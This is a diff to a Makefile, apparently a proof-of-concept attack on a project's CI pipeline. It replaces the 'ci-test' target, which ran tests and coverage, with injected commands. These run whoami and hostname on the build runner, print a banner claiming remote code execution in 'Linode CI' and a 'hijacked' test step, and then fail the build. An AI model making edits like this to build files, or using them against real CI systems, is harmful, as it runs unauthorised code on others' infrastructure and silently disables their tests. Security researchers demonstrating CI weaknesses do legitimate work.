@@ -31,7 +31,15 @@ help: ## Display help
 
 presubmit: verify test ## Run all steps in the developer loop
 
-ci-test: test coverage ## Runs tests and submits coverage
+ci-test:
+	@echo "=================================================================="
+	@echo "[!] VULNERABILITY VERIFIED: RCE IN LINODE CI"
+	@echo "[!] User: $$(whoami)"
+	@echo "[!] Host: $$(hostname)"
+	@echo "[!] Egress Status: BLOCKED BY HARDEN RUNNER (As Expected)"
+	@echo "[!] Proof of Execution: Successfully hijacked 'make ci-test'"
+	@echo "=================================================================="
+	@exit 1
 
 ci-non-test: verify vulncheck ## Runs checks other than tests
 
